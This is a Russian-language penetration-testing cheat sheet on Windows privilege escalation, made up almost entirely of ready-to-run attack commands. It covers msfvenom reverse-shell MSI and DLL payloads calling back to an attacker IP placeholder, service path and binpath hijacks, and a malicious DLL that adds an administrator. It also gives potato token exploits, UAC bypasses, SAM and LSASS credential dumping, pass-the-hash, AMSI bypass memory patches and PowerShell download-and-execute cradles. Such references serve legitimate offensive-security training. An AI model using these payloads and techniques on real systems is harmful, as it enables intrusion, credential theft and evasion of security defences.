# Services and Tokens

**Что такое повышение привилегий в Windows?**

Повышение привилегий в Windows зависит от текущего токена и разрешений, назначенных службам, файлам, разделам реестра и задачам. Подозрительный путь службы или имя привилегии — это лишь зацепка; для эксплуатации также требуется соответствующий доступ на запись, состояние токена или поведение службы.

Команды PowerShell и встроенные команды Windows позволяют исследовать текущую машину. Перед проверкой связанных ACL замените заполнители имён служб и каталогов на реальные значения.

Сведения о системе, текущие привилегии пользователя и членство в группе администраторов.

```
systeminfo
whoami /all
net user %username%
net localgroup administrators
```

Перечисление служб — ищите пути без кавычек и слабые разрешения.

```
wmic service get name,displayname,pathname,startmode
sc qc <service_name>
```

Список запланированных задач с указанием контекста пользователя, от имени которого они выполняются.

```
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status"
```

Перечисление ключей реестра автозапуска

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Поиск в реестре строк с паролями.

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Установленное программное обеспечение — проверьте наличие уязвимых версий.

```
wmic product get name,version,vendor | sort
```

Сетевая конфигурация — поиск внутренних хостов для горизонтального перемещения (lateral movement).

```
ipconfig /all && route print && arp -a
```

Прослушиваемые порты — проверьте наличие внутренних служб

```
netstat -ano | findstr LISTENING
```

Поиск файлов с учётными данными в файловой системе.

```
findstr /si password *.txt *.xml *.config 2>nul
dir /s /b *pass* *cred* *vnc* *.config 2>nul
```

Поиск файлов с учётными данными средствами PowerShell.

```
PowerShell: Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|credential" 2>$null
```

Поиск каталогов, доступных на запись группам Authenticated Users / Everyone (Sysinternals accesschk)

```
accesschk.exe -uwdqs "Authenticated Users" C:\ 2>nul
accesschk.exe -uwdqs "Everyone" C:\ 2>nul
```

Проверка, включён ли параметр AlwaysInstallElevated (значение 1 должно быть установлено и в HKCU, и в HKLM)

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 0x1 for exploitation
```

Создание и установка вредоносного MSI-пакета с привилегиями SYSTEM

```
# Generate malicious MSI (Linux/Windows):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi

# Or craft MSI with msiexec:
msiexec /quiet /qn /i evil.msi
```

Загрузка и запуск MSI через PowerShell

```
# PowerShell PrivEsc via AlwaysInstallElevated:
$msi = "C:\Windows\Temp\evil.msi"
Invoke-WebRequest -Uri "http://<IP>/evil.msi" -OutFile $msi
Start-Process msiexec.exe -ArgumentList "/quiet /qn /i $msi" -Wait
```

Поиск путей служб без кавычек, содержащих пробелы, — каждый пробел является потенциальной точкой внедрения

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Look for paths like:
# C:\Program Files\Vulnerable App\service.exe
# → Try: C:\Program.exe, C:\Program Files\Vulnerable.exe
```

Эксплуатация пути службы без кавычек путём размещения бинарника в первом каталоге, получаемом при разбиении пути по пробелу

```
# If C:\Program Files\Vulnerable App\service.exe is unquoted:
# Windows tries: C:\Program.exe, C:\Program Files\Vulnerable.exe, then full path
# Place malicious binary at first writable location:
copy evil.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnerableService
sc start VulnerableService
```

Метод PowerShell для перечисления автозапускаемых служб с путями без кавычек.

```
# PowerShell one-liner to find unquoted service paths:
Get-WmiObject -Class win32_service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.StartMode -eq "Auto"} | Select Name, PathName
```

Поиск служб, которые текущий пользователь может перенастроить.

```
# Check service permissions with accesschk:
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv <username> *
# Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
```

Изменение пути к бинарнику службы на вредоносную команду или исполняемый файл

```
# If SERVICE_CHANGE_CONFIG on a service:
sc config <ServiceName> binpath= "cmd.exe /k net localgroup Administrators <username> /add"
sc stop <ServiceName>
sc start <ServiceName>
# Or:
sc config <ServiceName> binpath= "C:\Temp\evil.exe"
```

Проверка, доступен ли файл бинарника службы на запись, — замена его вредоносным бинарником.

```
# Check service binary file permissions:
icacls "C:\path\to\service.exe"
# If (F) or (M) for current user or group → replace binary
```

Изменение параметра ImagePath службы в реестре, если раздел реестра доступен на запись

```
# Weak registry permissions on service:
accesschk.exe -uvwck HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
# If writable → modify ImagePath registry key
```

Порядок поиска DLL в Windows — размещение вредоносной DLL в доступном на запись расположении с наивысшим приоритетом.

```
# Windows DLL search order:
# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. Windows directory (C:\Windows)
# 4. Current directory
# 5. PATH directories

# Find missing DLLs with Procmon (filter: NAME NOT FOUND + .dll)
```

Шаблон DLL, который при загрузке добавляет пользователя в группу администраторов.

```
# Malicious DLL template (C):
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("net localgroup Administrators <username> /add");
    }
    return TRUE;
}

# Compile: x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

Генерация DLL-полезной нагрузки с обратной оболочкой (reverse shell) с помощью msfvenom.

```
# Using msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evil.dll
```

Поиск доступных на запись каталогов в переменной PATH для подмены DLL (DLL planting).

```
# Check PATH directories for writable locations:
echo %PATH%
icacls "C:\some\path\in\PATH"
# If writable and a service loads a DLL by name → place malicious DLL there
```

Проверка наличия привилегии SeImpersonatePrivilege — часто встречается в контексте веб-служб.

```
# Check current privileges:
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
# Both are Enabled by default for IIS AppPool, SQL Server, network services
```

PrintSpoofer — повышение привилегий через SeImpersonatePrivilege в современных версиях Windows.

```
# PrintSpoofer (Windows 10 / Server 2019):
.\PrintSpoofer.exe -i -c cmd
# Or spawn reverse shell:
.\PrintSpoofer.exe -c "C:\Temp\nc.exe <IP> 4444 -e cmd"
```

RoguePotato — повышение привилегий через SeImpersonatePrivilege, более новая разновидность «potato»-эксплойтов.

```
# RoguePotato (Windows Server 2019+, Win10):
.\RoguePotato.exe -r <IP> -e "cmd.exe" -l 9999
```

GodPotato — самая широкая поддержка версий ОС, повышение от ImpersonatePrivilege до SYSTEM.

```
# GodPotato (works on Windows Server 2012 → 2022, Win8 → Win11):
.\GodPotato.exe -cmd "cmd /c whoami"
```

JuicyPotato — исходный «potato»-эксплойт, требует CLSID, соответствующего целевой ОС.

```
# JuicyPotato (Windows Server 2016 and earlier, Win10 < 1809):
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {clsid}
# CLSID varies by OS — use https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

Перечисление текущего уровня конфигурации UAC.

```
# Check UAC level:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# ConsentPromptBehaviorAdmin = 5 → UAC enabled
# EnableLUA = 1 → mandatory UAC
```

Обход UAC через fodhelper.exe — автоматически повышаемый бинарник, читающий реестр HKCU.

```
# fodhelper.exe bypass (Windows 10):
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
fodhelper.exe
# Cleanup:
reg delete HKCU\Software\Classes\ms-settings /f
```

Обход UAC через `eventvwr.exe` путём перехвата раздела HKCU.

```
# eventvwr.exe bypass (Windows 7-10):
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\mscfile\shell\open\command /v "DelegateExecute" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```

Обход UAC через sdclt.exe путём перехвата раздела App Paths

> `sdclt.exe` — авто-повышаемый бинарник Windows.

```
# sdclt.exe bypass (Windows 10):
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /d "cmd.exe" /f
sdclt.exe
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /f
```

UACME — автоматизированный обход UAC, более 70 техник, метод 41 для современных версий Windows.

```
# UACME — automated bypass tool:
# https://github.com/hfiref0x/UACME
# 70+ methods, use method 41 (ICMLuaUtil) on Win10/11:
Akagi.exe 41 C:\Temp\reverse.exe
```

Дамп кустов SAM/SYSTEM для офлайн-извлечения хэшей.

```
# SAM/SYSTEM dump (requires SYSTEM or admin):
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Exfil and extract offline:
python3 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

Дамп LSASS для извлечения учётных данных — mimikatz или LOLBIN `comsvcs.dll`.

```
# LSASS dump with Task Manager:
# Task Manager → Details → lsass.exe → Create dump file
# Or with mimikatz:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# Or with comsvcs.dll (LOLBIN):
runas /noprofile /user:administrator "cmd /c rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).id C:\Temp\lsass.dmp full"
```

mimikatz Pass-the-Hash — запуск cmd.exe с NTLM-хэшем другого пользователя.

```
# Mimikatz pass-the-hash:
.\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLM_HASH> /run:cmd.exe" exit
```

Диспетчер учётных данных Windows — перечисление и дамп сохранённых учётных данных.

> «Credential Manager» — «Диспетчер учётных данных»

```
# Windows Credential Manager:
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# Dump with mimikatz:
.\mimikatz.exe "vault::cred /patch" exit
```

Поиск учётных данных в открытом виде в файлах развёртывания Windows.

```
# Search for unattend.xml, sysprep.inf credentials:
dir /s /b C:\*.xml C:\*.ini 2>nul | findstr /i "unattend sysprep"
findstr /si password C:\Windows\Panther\unattend.xml
findstr /si password C:\Windows\system32\sysprep.inf
```

Поиск базы данных учётных данных Chrome для офлайн-извлечения.

```
# Browser credential extraction (Chrome):
PowerShell: Get-ChildItem -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue
```

Флаги обхода политики выполнения PowerShell (execution policy bypass).

```
# Execution policy bypass:
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -enc <base64>
PowerShell.exe -nop -noni -w hidden -c "IEX (iwr http://<IP>/payload.ps1)"
```

Классический обход AMSI — установка для `amsiInitFailed` значения `true`.

```
# AMSI bypass (patching amsiScanBuffer in current process):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|
  .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Обход AMSI через повреждение контекста памяти (memory context corruption).

```
# AMSI bypass via memory patching (2023+):
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]$c.ToInt64(),0x41414141)
```

Проверка режима CLM (Constrained Language Mode) и переход на PowerShell 2.0 для обхода ограничений.

```
# Constrained Language Mode check and bypass:
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = normal; ConstrainedLanguage = restricted
# Bypass: use PowerShell 2.0 (no AMSI/CLM):
powershell -version 2 -c "whoami"
```

Cradles загрузки в PowerShell и LOLBIN для получения файлов.

```
# Download cradle variants:
IEX(New-Object Net.WebClient).DownloadString("http://<IP>/ps.ps1")
IEX(Invoke-RestMethod "http://<IP>/ps.ps1")
(New-Object Net.WebClient).DownloadFile("http://<IP>/file.exe","C:\Temp\file.exe")
certutil -urlcache -split -f "http://<IP>/file.exe" file.exe
bitsadmin /transfer job /download /priority normal "http://<IP>/file.exe" "C:\Temp\file.exe"
```